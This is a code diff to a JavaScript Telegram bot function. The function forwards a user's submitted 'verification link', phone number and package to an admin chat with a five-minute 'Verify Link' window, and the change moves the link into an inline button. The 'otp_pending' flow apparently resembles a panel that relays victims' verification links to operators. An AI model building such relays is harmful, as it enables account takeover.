@@ -393,19 +393,20 @@ function submitLink(requestId, link) {
     request.status = 'otp_pending';
 
     if (botEnabled && bot) {
+        const escapedLink = encodeURI(link).replace(/[\(\)\[\]]/g, '');
         const keyboard = {
             inline_keyboard: [
+                [{ text: '🔗 Open Verification Link', url: escapedLink }],
                 [{ text: '✅ Verify Link', callback_data: `link_approve_${requestId}` },
                  { text: '❌ Invalid Link', callback_data: `link_invalid_${requestId}` }]
             ]
         };
-        const escapedLink = encodeURI(link).replace(/[\(\)\[\]]/g, '');
         bot.sendMessage(adminChatId, `🔗 Verification Link Submitted\n\n` +
             `📱 Phone: ${request.userPhone}\n` +
             `📦 Package: ${request.package}\n` +
-            `🔗 [Click here to verify](${escapedLink})\n\n` +
+            `🔗 Link: ${escapedLink}\n\n` +
             `Please verify by clicking "Verify Link" and confirming.\n` +
-            `⏱️ You have 5 minutes.`, { reply_markup: keyboard, parse_mode: 'Markdown' }).then((msg) => {
+            `⏱️ You have 5 minutes.`, { reply_markup: keyboard }).then((msg) => {
             request.adminOtpMessageId = msg.message_id;
         }).catch((err) => {
             console.error('Failed to send link notification:', err.message);
